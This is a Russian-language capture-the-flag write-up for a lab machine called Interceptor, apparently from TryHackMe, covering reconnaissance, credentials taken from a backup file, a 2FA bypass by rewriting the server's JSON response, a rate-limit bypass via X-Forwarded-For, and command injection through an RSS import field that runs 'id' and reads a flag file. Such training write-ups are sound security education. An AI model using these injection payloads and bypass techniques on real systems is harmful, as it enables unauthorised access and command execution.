# Отчёт о прохождении машины Interceptor

## 1. Общая информация

**Задание:** MediaHub — внутренний портал для журналистов, защищённый двухфакторной аутентификацией. Цель — перехватить и модифицировать трафик между браузером и сервером, чтобы обойти систему авторизации и скомпрометировать систему.

**Подход:** Основной фокус — анализ API-запросов, модификация ответов сервера и эксплуатация Command Injection через RSS-импорт.


## 2. Разведка и анализ поверхности

### 2.1 Nmap-скан

```bash
nmap -sV -sC -p- 10.112.161.86
```

Результаты сканирования выявили следующие открытые порты:

- **22/tcp** — OpenSSH 8.2p1
- **53/tcp** — domain (ISC BIND 9.16.1)
- **80/tcp** — Apache/2.4.41 (PHP)

### 2.2 Фаззинг веб-директорий

```bash
gobuster dir -u http://10.112.161.86 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Обнаружены следующие пути:

- `/assets` — статические файлы (301 → /assets/)
- `/config.php` — пустой (200)
- `/dashboard.php` — редирект на `/login.php` (302)
- `/opt.php` - редирект на `/login.php` (302)
- `/uploads` — директория для загрузок (200, размер 982)
- `/javascript` — доступ запрещён (403)
- `/phpmyadmin` — панель управления БД (200, размер 14773)


## 3. Анализ API-эндпоинтов и обход авторизации

### 3.1 Изучение `/api_login.php`

Перехвачен запрос на `/api_login.php` в формате `multipart/form-data`. Ответ возвращается в JSON.

**Попытки эксплуатации:**

- SQL-инъекция в POST-параметрах (`email=test' OR 1=1 --`) — сервер вернул ошибку rate-limit.
- NoSQL-инъекция, LDAP-инъекция, Command Injection — безрезультатно.
- Обход rate-limit через заголовок `X-Forwarded-For` — успешно.

### 3.2 Нахождение учётных данных

В файле `/login.php.bak` обнаружена временная заметка разработчика:

```php
/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
*/
```

Креды проверены:

```
email=admin@mediahub.thm
password=MediaHub2026
```

Ответ сервера:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```


## 4. Обход двухфакторной аутентификации

### 4.1 Попытка брутфорса OTP

После успешного входа сервер перенаправляет на `/otp.php` для ввода шестизначного кода.

Написан скрипт для брутфорса PIN-кода с обходом rate-limit через подмену `X-Forwarded-For`. Однако перебор шестизначного кода (от `000000` до `999999`) — 1 миллион комбинаций — занимает слишком много времени.

### 4.2 Подмена ответа сервера

Вместо перебора кода было решено **подменить ответ сервера** на запрос проверки OTP.

**Исходный ответ:**
```json
{"ok":false,"error":"Invalid OTP"}
```

**Изменённый ответ:**
```json
{"ok":true,"is_verified":true}
```

Сервер принял подмену и перенаправил на `/dashboard.php`. Доступ получен.

### 4.3 Завершение авторизации

После подмены ответа браузер перешёл на дашборд. Сессия была установлена, и доступ к функционалу стал возможен.


## 5. Исследование дашборда и поиск уязвимостей

### 5.1 Функционал импорта новостей

На дашборде обнаружена функция **«Import Feed»**, которая позволяет загружать RSS/Atom-ленту по URL. Сервер делает запрос к указанному адресу и возвращает содержимое.

**Попытки эксплуатации:**

- Внешний URL (`http://example.com/feed.xml`) — ошибка `Internet not connected` с выводом логов `curl`.
- Обход через `||` и `;` — команда выполняется.

### 5.2 Command Injection в RSS-импорте

В поле ввода URL была подставлена команда через разделитель `||`:

```
http://example.com/feed.xml||id
```

Ответ сервера:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(findgroup),1003(websql)
```

**Command Injection подтверждена.**

### 5.3 Чтение флага

```
http://example.com/feed.xml||cat /var/www/user.txt
```

Ответ:

```
THM{SYSTEM_PWNED_SUCCESSFULLY}
```

Флаг получен.


## 6. Итог

### 6.1 Цепочка атаки

1. **Разведка:** Nmap, Gobuster → обнаружение `/login.php.bak` с кредами.
2. **Обход OTP:** Подмена ответа сервера с `{"ok":false}` на `{"ok":true,"is_verified":true}`.
3. **Доступ к дашборду:** Вход как администратор.
4. **Command Injection:** Эксплуатация RSS-импорта через `||` для выполнения команд.
5. **Чтение флага:** `cat /var/www/user.txt`.

### 6.2 Ключевые находки

| Уязвимость | Описание |
|------------|----------|
| **Некорректная проверка OTP** | Сервер доверяет ответу клиента — подмена `is_verified:true` обходит 2FA. |
| **Command Injection в RSS-импорте** | Параметр URL не экранируется, что позволяет выполнять команды через `||`. |
| **Открытый бэкап** | `/login.php.bak` содержит учётные данные и парольную политику. |
| **Rate-limit bypass** | `X-Forwarded-For` позволяет обойти ограничение запросов. |

### 6.3 Найденные учётные данные

| Пользователь | Пароль | Источник |
|--------------|--------|----------|
| `admin@mediahub.thm` | `MediaHub2026` | `/login.php.bak` |

### 6.4 Достижения и новые навыки

**Подмена ответа сервера (Response Manipulation)** — впервые использована техника модификации JSON-ответа сервера для обхода двухфакторной аутентификации. Вместо перебора PIN-кода (1 млн комбинаций) удалось обойти проверку, подменив `"ok":false` на `"ok":true` и добавив `"is_verified":true`.

**Command Injection через RSS-импорт** — эксплуатация уязвимости в функционале импорта новостей. Использован разделитель `||` для выполнения команд на сервере от имени пользователя `www-data`.

**Обход rate-limit через `X-Forwarded-For`** — отработана техника подмены IP-адреса для обхода ограничений на количество запросов.

**Анализ API-трафика** — проведён глубокий анализ запросов к `/api_login.php` и `/verify_otp.php`. Изучены форматы данных (`multipart/form-data`, `application/x-www-form-urlencoded`, JSON) и различные методы аутентификации.

**Перехват и модификация запросов** — отработка навыков работы с Burp Suite для перехвата и изменения как запросов, так и ответов, включая настройку перехвата серверных ответов.

**Работа с `login.php.bak`** — обнаружение файла резервной копии, содержащего учётные данные и подсказку по парольной политике. Использование этой информации для входа.

**Брутфорс OTP с обходом rate-limit** — написан скрипт на Python для перебора шестизначного PIN-кода с использованием заголовка `X-Forwarded-For`. Хотя брутфорс занял бы длительное время, сам подход отработан и применён.
